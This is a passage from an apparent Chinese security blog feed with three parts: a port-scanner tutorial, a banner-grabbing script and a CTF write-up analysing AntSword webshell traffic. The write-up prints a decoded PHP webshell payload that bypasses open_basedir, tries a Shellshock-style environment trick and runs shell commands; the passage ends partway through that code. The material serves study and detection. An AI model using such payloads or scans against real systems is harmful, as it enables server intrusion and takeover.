KeyboardInterrupt:</span><br><span class=\"line\">        print(&quot;interrupted by user,killing all threads...&quot;)</span><br></pre></td></tr></table></figure>\n<p>在 request () 函数中，首先调用 sock.connect () 函数探测目标主机的端口是否开放，如果端口开放，则利用 sock.sendall () 函数将 PROBE 探针发送给目标端口。sock.recv () 函数用于接收返回的指纹信息，并将指纹信息及端口发送到 regex () 函数</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def request(ip,port):</span><br><span class=\"line\">    response = &#x27;&#x27;</span><br><span class=\"line\">    PROBE = &#x27;GET / HTTP/1.0\\r\\n\\r\\n&#x27;</span><br><span class=\"line\">    sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class=\"line\">    sock.settimeout(10)</span><br><span class=\"line\">    result = sock.connect_ex((ip,int(port)))</span><br><span class=\"line\">    if result == 0:</span><br><span class=\"line\">        try:</span><br><span class=\"line\">            sock.sendall(PROBE.encode())</span><br><span class=\"line\">            response = sock.recv(256)</span><br><span class=\"line\">            if response:</span><br><span class=\"line\">                regex(response,port)</span><br><span class=\"line\">        except(ConnectionResetError,socket.timeout):</span><br><span class=\"line\">           pass</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        pass</span><br></pre></td></tr></table></figure>\n<p>利用 re.search () 函数将返回的 banner 信息与 SIGNS 包含的指纹信息进行正则匹配，并将匹配到的结果输出。如果没有在 SIGNS 中找到想匹配的信息，则输出 Unrecognized</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def regex(response,port):</span><br><span class=\"line\">    text = &quot;&quot;</span><br><span class=\"line\">    if re.search(b&#x27;&lt;title&gt;502 Bad Geteway&#x27;,response):</span><br><span class=\"line\">        proto = &#123;&quot;Service failed to access!!&quot;&#125;</span><br><span class=\"line\">    for pattern in SIGNS:</span><br><span class=\"line\">        pattern = pattern.split(b&#x27;|&#x27;)</span><br><span class=\"line\">        if re.search(pattern[-1],response,re.IGNORECASE):</span><br><span class=\"line\">            proto = &quot;[&quot;+port+&quot;]&quot;+&quot;open&quot;+pattern[1].decode()</span><br><span class=\"line\">            break</span><br><span class=\"line\">        else:</span><br><span class=\"line\">            proto = &quot;[&quot;+port+&quot;]&quot;+&quot;open&quot;+&quot;Unrecognized&quot;</span><br><span class=\"line\">        print(proto)</span><br></pre></td></tr></table></figure>\n<p>市面上的软件种类繁多，版本也不一样，因此端口服务版本要想实现比较困难，</p>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B/",
            "url": "https://nnnpc.github.io/2024/04/16/%E4%B8%BB%E5%8A%A8%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86%E2%80%94%E2%80%94%E7%AB%AF%E5%8F%A3%E6%8E%A2%E6%B5%8B/",
            "title": "主动信息收集------端口探测",
            "date_published": "2024-04-16T05:58:19.062Z",
            "content_html": "<blockquote>\n<p>端口是设备与外界通信交流的接口，如果把服务器看作一栋房子，那么端口就是可以进出这栋房子的门。真正的房子只有一个或者几个门，但是服务器至多可以有 65536 个门。不同的端口指向不同的服务，就像不同的门对应不同的房间<br>\n最常见的三个服务端口就是 80、21、3389，分别对应的是浏览网页时涉及的 www 服务，上传和下载文件的服务，远程桌面的服务。如果入侵者想要控制这个服务器，那么肯定得先通过一个端口进入该服务，就如同控制房子首先得通过门进入房间一样，因此，在信息的收集阶段，端口的扫描就尤为重要</p>\n</blockquote>\n<p>这里使用 python 的 socket 模块来进行端口扫描的编写，先导入需要用到的模块</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import sys</span><br><span class=\"line\">import socket</span><br><span class=\"line\">import optparse</span><br><span class=\"line\">import threading</span><br><span class=\"line\">import queque</span><br></pre></td></tr></table></figure>\n<p>接着编写一个端口扫描类，继承 threading.Thread。这个类需要传递 3 个参数，分别是目标 IP、端口队列、超时时间，通过这个类来创造多个子线程来加快扫描速度</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 端口扫描类,继承threading.Thread</span><br><span class=\"line\">class PortScaner(threading.Thread):</span><br><span class=\"line\">    def __init__(self, portqueue, ip, timeout=3):</span><br><span class=\"line\">        threading.Thread.__init__(self)</span><br><span class=\"line\">        self._potqueue = portqueue</span><br><span class=\"line\">        self._ip = ip</span><br><span class=\"line\">        self._timeout = timeout</span><br><span class=\"line\"></span><br><span class=\"line\">    def run(self):</span><br><span class=\"line\">        while True:</span><br><span class=\"line\">            # 判断端口队列是否为空</span><br><span class=\"line\">            if self._portqueue.empty():</span><br><span class=\"line\">                # 端口队列为空，说明已经扫描完毕，跳出循环</span><br><span class=\"line\">                break</span><br><span class=\"line\">            # 从端口队列中取出端口，超时时间为1s</span><br><span class=\"line\">            port = self._portqueue.get(timeout=0.5)</span><br><span class=\"line\">            try:</span><br><span class=\"line\">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class=\"line\">                s.settimeout(self._timeout)</span><br><span class=\"line\">                result_code = s.connect_ex((self._ip, port))</span><br><span class=\"line\">                # sys.stdout.write(&quot;[%d]Scan\\n&quot;%port)</span><br><span class=\"line\">                # 若端口开放，则会返回0</span><br><span class=\"line\">                if result_code == 0:</span><br><span class=\"line\">                    sys.stdout.write(&quot;[%d] OPEN\\n&quot; % port)</span><br><span class=\"line\">            except Exception as e:</span><br><span class=\"line\">                print(e)</span><br><span class=\"line\">            finally:</span><br><span class=\"line\">                s.close()</span><br></pre></td></tr></table></figure>\n<p>编写一个函数，根据用户的参数来指定目标 IP、端口队列的生成以及子线程的生成，同时能支持单个端口的扫描和范围端口的扫描</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">def StartScan(targetip, port, threadNum):</span><br><span class=\"line\">    # 端口列表</span><br><span class=\"line\">    portList = []</span><br><span class=\"line\">    portNumb = port</span><br><span class=\"line\">    # 判断是单个端口还是范围端口</span><br><span class=\"line\">    if &#x27;-&#x27; in port:</span><br><span class=\"line\">        for i in range(int(port.split(&#x27;-&#x27;)[0]), int(port.split(&#x27;-&#x27;)[1]) + 1):</span><br><span class=\"line\">            portList.append(i)</span><br><span class=\"line\">    else:</span><br><span class=\"line\">        portList.append(int(port))</span><br><span class=\"line\">    # 目标IP地址</span><br><span class=\"line\">    ip = targetip</span><br><span class=\"line\">    # 线程列表</span><br><span class=\"line\">    threads = []</span><br><span class=\"line\">    # 线程数量</span><br><span class=\"line\">    threadNumber = threadNum</span><br><span class=\"line\">    # 端口队列</span><br><span class=\"line\">    portQueue = queue.Queue()</span><br><span class=\"line\">    # 生成端口，加入端口队列</span><br><span class=\"line\">    for port in portList:</span><br><span class=\"line\">        portQueue.put(port)</span><br><span class=\"line\">    for t in range(threadNumber):</span><br><span class=\"line\">        threads.append(PortScaner(portQueue, ip, timeout=3))</span><br><span class=\"line\">    # 启动线程</span><br><span class=\"line\">    for thread in threads:</span><br><span class=\"line\">        thread.start()</span><br><span class=\"line\">    # 阻塞线程</span><br><span class=\"line\">    for thread in threads:</span><br><span class=\"line\">        thread.join()</span><br></pre></td></tr></table></figure>\n<p>编写主函数来指定参数的规则</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">if __name__ == &#x27;__main__&#x27;:</span><br><span class=\"line\">    parser = optparse.OptionParser(&#x27;Example:python %prog -i 127.0.0.1 -p 80 \\n python %prog -i 127.0.0.1 -p 1-100\\n&#x27;)</span><br><span class=\"line\">    # 目标IP参数-i</span><br><span class=\"line\">    parser.add_option(&#x27;-i&#x27;, &#x27;--ip&#x27;, dest=&#x27;targetIP&#x27;, default=&#x27;127.0.0.1&#x27;, type=&#x27;string&#x27;, help=&#x27;target IP&#x27;)</span><br><span class=\"line\">    # 添加端口参数-p</span><br><span class=\"line\">    parser.add_option(&#x27;-p&#x27;, &#x27;--port&#x27;, dest=&#x27;port&#x27;, default=&#x27;80&#x27;, type=&#x27;string&#x27;, help=&#x27;scann port&#x27;)</span><br><span class=\"line\">    # 线程数量参数-t</span><br><span class=\"line\">    parser.add_option(&#x27;-t&#x27;, &#x27;--thread&#x27;, dest=&#x27;threadNum&#x27;, default=100, type=&#x27;int&#x27;, help=&#x27;scann thread number&#x27;)</span><br><span class=\"line\">    (options, args) = parser.parse_args()</span><br><span class=\"line\">StartScan(options.targetIP, options.port, options.threadNum)</span><br></pre></td></tr></table></figure>\n<p>接下来用自己的服务器测试一下开放端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./ce.py -i ip -p 端口</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/7vUkGrUiTBOK48Ag.png!thumbnail\" alt=\"\"></p>\n<p>这是测试单个端口的开放，也同时可以设置多线程跑范围端口</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python3 ./ce.py -i ip -p 1-3500 -t 100</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/62ddNYx8s5Zy4KAq.png!thumbnail\" alt=\"\"></p>\n<p>同时也可以使用 nmap 库来修改工具进行端口扫描，所需修改的部分代码：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">result = nm.scan(hosts=targetIP,arguments=&#x27;-p&#x27;+str(targetPort))</span><br></pre></td></tr></table></figure>\n",
            "tags": [
                "python"
            ]
        },
        {
            "id": "https://nnnpc.github.io/2024/04/16/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "url": "https://nnnpc.github.io/2024/04/16/%E8%9A%81%E5%89%91%E6%B5%81%E9%87%8F%E6%B5%85%E6%9E%90/",
            "title": "蚁剑流量浅析",
            "date_published": "2024-04-16T05:58:19.061Z",
            "content_html": "<p>最近回顾了一道蚁剑的流量分析题目，就像借着这个机会记录一下学习内容</p>\n<p>先看题目</p>\n<blockquote>\n<p>题目是 2022DASCTF Apr X FATE 防疫挑战赛的流量分析题</p>\n</blockquote>\n<p>首先打开流量包，查看下 tcp 追踪流</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/BrLogKUK1bDSvRZr.png!thumbnail\" alt=\"\"></p>\n<p>发现了流 52 有带有 flag.txt 字样的 zip</p>\n<p>可以手动分离也可以 binwalk 或者 foremost，分离出压缩包发现是加密的</p>\n<p>那就需要找到压缩包密码，去看看之前的追踪流</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/UGnmP5f9GfMOWbOv.png!thumbnail\" alt=\"\"></p>\n<p>在流 50 找到了压缩包的加密过程，解码上面的密文进行阅读分析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/9nPVl560teeyA72N.png!thumbnail\" alt=\"\"></p>\n<p>在这里发现了压缩包的密码 PaSsZiPWorD</p>\n<p>解压压缩包得到 flag</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/4pRBtAmR7ryLDMEa.png!thumbnail\" alt=\"\"></p>\n<p><strong>DASCTF{f3f32f434eddbc6e6b5043373af95ae8}</strong></p>\n<p>题目做完了就想着自己去截取流量分析一下，于是就在 ctfshow 开了一个文件上传的环境</p>\n<p>成功将马上传了之后使用蚁剑 getshell，这里是不使用任何的加密方式，采用蚁剑的虚拟终端敲了两个命令来获取 flag，截取流量进行分析</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/5nse7uTKfmarqikw.png!thumbnail\" alt=\"\"></p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/uKWFk0WTCHMdIyDo.png!thumbnail\" alt=\"\"></p>\n<p>wireshark 捕获设置为 WLAN 之后点击开始，截取之后进行分析</p>\n<p>tcp 流 22：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/ZNH5ygLPLBzjGR5c.png!thumbnail\" alt=\"\"></p>\n<p>发现成功截取</p>\n<p>观察 tcp 追踪流，这里也显示了蚁剑流量的一个明显的特征：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">a=@ini_set(&quot;display_errors&quot;, &quot;0&quot;)</span><br></pre></td></tr></table></figure>\n<p>这个在蚁剑当中是以明文的方式出现的，而其他的 webshell 管理工具一般会进行加密，继续分析，这里是蚁剑中虚拟终端输入的第一个命令<br>\n<img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/2ia6d6zo2vGm9RB1.png!thumbnail\" alt=\"\" title=\"fig:\"></p>\n<p>将该流的这个 base64 解码能够看到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1PFy377d6fTcYlVm.png!thumbnail\" alt=\"\"></p>\n<p>可以看到后面的流一样显示截取的蚁剑流量</p>\n<p>tcp 流 33：</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/1W9vgNWmiVUPrsLx.png!thumbnail\" alt=\"\"></p>\n<p>该流就是输入的第二个命令了，就不演示解码了，同时在 http 流能够看到 cat<br>\nflag.php 之后的具体内容</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/vgvaL6WS3qnbyt6j.png!thumbnail\" alt=\"\"></p>\n<p>同样的</p>\n<p>继续使用 base64 加解密的方式对数据进行数据处理试试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/AX7a0hdjCIhiohFQ.png!thumbnail\" alt=\"\"></p>\n<p>保存数据，用虚拟终端输入命令获取 flag 进行测试</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/YLmJEgedd3h8dOmk.png!thumbnail\" alt=\"\"></p>\n<p>可以仔细看看加密之后的一整串 base64 解码之后的样子，这里以 tcp 流 5 为例</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/q6Gf7Y2aPhC0KeeW.png!thumbnail\" alt=\"\"></p>\n<p>进行解码得到</p>\n<p><img data-src=\"https://nnnpc-1311441040.cos.ap-shanghai.myqcloud.com/jhtAGxmT8JxJ9qmp.png!thumbnail\" alt=\"\"></p>\n<p>方便查看可以格式化一下代码</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);</span><br><span class=\"line\">@set_time_limit(0);</span><br><span class=\"line\">$opdir=@ini_get(&quot;open_basedir&quot;);</span><br><span class=\"line\">if($opdir) &#123;</span><br><span class=\"line\">\t$ocwd=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class=\"line\">\t$oparr=preg_split(&quot;/;|:/&quot;,$opdir);</span><br><span class=\"line\">\t@array_push($oparr,$ocwd,sys_get_temp_dir());</span><br><span class=\"line\">\tforeach($oparr as $item) &#123;</span><br><span class=\"line\">\t\tif(!@is_writable($item)) &#123;</span><br><span class=\"line\">\t\t\tcontinue;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t;</span><br><span class=\"line\">\t\t$tmdir=$item.&quot;/.6a33b73913&quot;;</span><br><span class=\"line\">\t\t@mkdir($tmdir);</span><br><span class=\"line\">\t\tif(!@file_exists($tmdir)) &#123;</span><br><span class=\"line\">\t\t\tcontinue;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t@chdir($tmdir);</span><br><span class=\"line\">\t\t@ini_set(&quot;open_basedir&quot;, &quot;..&quot;);</span><br><span class=\"line\">\t\t$cntarr=@preg_split(&quot;/\\\\\\\\|\\//&quot;,$tmdir);</span><br><span class=\"line\">\t\tfor ($i=0;$i&lt;sizeof($cntarr);$i++) &#123;</span><br><span class=\"line\">\t\t\t@chdir(&quot;..&quot;);</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\t;</span><br><span class=\"line\">\t\t@ini_set(&quot;open_basedir&quot;,&quot;/&quot;);</span><br><span class=\"line\">\t\t@rmdir($tmdir);</span><br><span class=\"line\">\t\tbreak;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">;</span><br><span class=\"line\">;</span><br><span class=\"line\">function asenc($out) &#123;</span><br><span class=\"line\">\treturn @base64_encode($out);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">;</span><br><span class=\"line\">function asoutput() &#123;</span><br><span class=\"line\">\t$output=ob_get_contents();</span><br><span class=\"line\">\tob_end_clean();</span><br><span class=\"line\">\techo &quot;95&quot;.&quot;44e&quot;;</span><br><span class=\"line\">\techo @asenc($output);</span><br><span class=\"line\">\techo &quot;1911&quot;.&quot;b6c9&quot;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">ob_start();</span><br><span class=\"line\">try &#123;</span><br><span class=\"line\">\t$p=base64_decode(substr($_POST[&quot;ka199f64875418&quot;],2));</span><br><span class=\"line\">\t$s=base64_decode(substr($_POST[&quot;n7573f80f63f59&quot;],2));</span><br><span class=\"line\">\t$envstr=@base64_decode(substr($_POST[&quot;w2b059d24e126c&quot;],2));</span><br><span class=\"line\">\t$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class=\"line\">\t$c=substr($d,0,1)==&quot;/&quot;?&quot;-c \\&quot;&#123;$s&#125;\\&quot;&quot;:&quot;/c \\&quot;&#123;$s&#125;\\&quot;&quot;;</span><br><span class=\"line\">\tif(substr($d,0,1)==&quot;/&quot;) &#123;</span><br><span class=\"line\">\t\t@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;);</span><br><span class=\"line\">\t&#125; else &#123;</span><br><span class=\"line\">\t\t@putenv(&quot;PATH=&quot;.getenv(&quot;PATH&quot;).&quot;;C:/Windows/system32;C:/Windows/SysWOW64;C:/Windows;C:/Windows/System32/WindowsPowerShell/v1.0/;&quot;);</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\tif(!empty($envstr)) &#123;</span><br><span class=\"line\">\t\t$envarr=explode(&quot;|||asline|||&quot;, $envstr);</span><br><span class=\"line\">\t\tforeach($envarr as $v) &#123;</span><br><span class=\"line\">\t\t\tif (!empty($v)) &#123;</span><br><span class=\"line\">\t\t\t\t@putenv(str_replace(&quot;|||askey|||&quot;, &quot;=&quot;, $v));</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t$r=&quot;&#123;$p&#125; &#123;$c&#125;&quot;;</span><br><span class=\"line\">\tfunction fe($f) &#123;</span><br><span class=\"line\">\t\t$d=explode(&quot;,&quot;,@ini_get(&quot;disable_functions&quot;));</span><br><span class=\"line\">\t\tif(empty($d)) &#123;</span><br><span class=\"line\">\t\t\t$d=array();</span><br><span class=\"line\">\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t$d=array_map(&#x27;trim&#x27;,array_map(&#x27;strtolower&#x27;,$d));</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn(function_exists($f)&amp;&amp;is_callable($f)&amp;&amp;!in_array($f,$d));</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t;</span><br><span class=\"line\">\tfunction runshellshock($d, $c) &#123;</span><br><span class=\"line\">\t\tif (substr($d, 0, 1) == &quot;/&quot; &amp;&amp; fe(&#x27;putenv&#x27;) &amp;&amp; (fe(&#x27;error_log&#x27;) || fe(&#x27;mail&#x27;))) &#123;</span><br><span class=\"line\">\t\t\tif (strstr(readlink(&quot;/bin/sh&quot;), &quot;bash&quot;) != FALSE) &#123;</span><br><span class=\"line\">\t\t\t\t$tmp = tempnam(sys_get_temp_dir(), &#x27;as&#x27;);</span><br><span class=\"line\">\t\t\t\tputenv(&quot;PHP_LOL=() &#123; x; &#125;; $c &gt;$tmp 2&gt;&amp;1&quot;);</span><br><span class=\"line\">\t\t\t\tif (fe(&#x27;error_log&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t\t\terror_log(&quot;a&quot;, 1);</span><br><span class=\"line\">\t\t\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t\t\tmail(&quot;a@127.0.0.1&quot;, &quot;&quot;, &quot;&quot;, &quot;-bv&quot;);</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125; else &#123;</span><br><span class=\"line\">\t\t\t\treturn False;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t$output = @file_get_contents($tmp);</span><br><span class=\"line\">\t\t\t@unlink($tmp);</span><br><span class=\"line\">\t\t\tif ($output != &quot;&quot;) &#123;</span><br><span class=\"line\">\t\t\t\tprint($output);</span><br><span class=\"line\">\t\t\t\treturn True;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t\treturn False;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t;</span><br><span class=\"line\">\tfunction runcmd($c) &#123;</span><br><span class=\"line\">\t\t$ret=0;</span><br><span class=\"line\">\t\t$d=dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class=\"line\">\t\tif(fe(&#x27;system&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t@system($c,$ret);</span><br><span class=\"line\">\t\t&#125; elseif(fe(&#x27;passthru&#x27;)) &#123;</span><br><span class=\"line\">\t\t\t@passthru($c,$ret);</span><br><span class=\"line\">\t\t&#125; elseif(fe(&#x27;shell_exec&#x27;)) 